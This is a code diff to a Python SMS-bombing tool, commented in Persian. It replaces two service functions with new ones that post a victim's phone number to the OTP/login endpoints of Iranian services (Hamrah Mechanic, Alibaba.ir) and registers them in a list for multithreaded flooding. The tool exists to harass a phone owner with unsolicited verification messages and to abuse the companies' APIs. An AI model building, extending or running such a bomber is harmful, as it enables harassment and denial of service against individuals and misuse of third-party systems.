@@ -64,89 +64,33 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
-def SibApp(phone):
+def mek(phone):
+    formatted_phone = format_phone(phone)
+    meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
+    meD = {"phoneNumber": formatted_phone}
     try:
-        url = "https://api.sibapp.net/api/v1/user/register"
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"
-        
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json; charset=UTF-8",
-            "Cache-Control": "no-cache",
-            "User-Agent": random.choice(user_agents),
-        }
-        
-        payload = {
-            "phone_number": formatted_phone
-        }
-        
-        response = requests.post(
-            url, 
-            json=payload, 
-            headers=headers, 
-            timeout=10,
-            verify=False
-        )
-        
-        print(f'{y}[Debug] SibApp Status: {response.status_code}{a}')
-        print(f'{y}[Debug] SibApp Response: {response.text}{a}')
-        
-        if response.status_code in [200, 201]:
-            print(f'{g}(SibApp) SMS Sent Successfully{a}')
-            return True
-        else:
-            print(f'{r}[-] SibApp Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] SibApp Exception: {e}{a}')
-        return False
-
-def Komodaa(phone):
-    try:
-        url = "https://api.komodaa.com/api/v2.6/loginRC/request"
-        
-        # فرمت شماره
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"
-        
-        headers = {
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-            "web-user-agent": "komodaa/7.0.1.301 Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
-            "install-ref": "WEB",
-            "k-session-id": f"{uuid.uuid4().hex}-{uuid.uuid4().hex[:12]}",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
-        }
-        
-        payload = {
-            "phone_number": formatted_phone
-        }
-        
-        response = requests.post(
-            url, 
-            json=payload, 
-            headers=headers, 
-            timeout=10,
-            verify=False
-        )
-        
-        print(f'{y}[Debug] Komodaa Status: {response.status_code}{a}')
-        print(f'{y}[Debug] Komodaa Response: {response.text}{a}')
-        
-        if response.status_code in [200, 201]:
-            print(f'{g}(Komodaa) SMS Sent Successfully!{a}')
-            return True
-        else:
-            print(f'{r}[-] Komodaa Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] Komodaa Exception: {e}{a}')
+        r = requests.post(url=meU, data=meD, timeout=5)
+        print(r.status_code, r.text)  # برای debug
+        return r.json().get('isSuccess', False)
+    except Exception as e: 
+        print(f"{r}[!] HamrahMechanic Exception: {e}")
         return False
 
 
+def alibaba(phone):
+    formatted_phone = format_phone(phone)
+    alibabaD = {"phoneNumber": formatted_phone}
+    try:
+        r = requests.post(
+            url='https://ws.alibaba.ir/api/v3/account/mobile/otp',
+            json=alibabaD,
+            timeout=5
+        )
+        print(r.status_code, r.text)  # برای debug
+        return r.json().get("result", {}).get("success", False)
+    except Exception as e:
+        print(f"{r}[!] AliBaba Exception: {e}")
+        return False
 
 
 
@@ -154,7 +98,7 @@ def Komodaa(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [  Komodaa, SibApp]
+services = [alibaba, mek]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
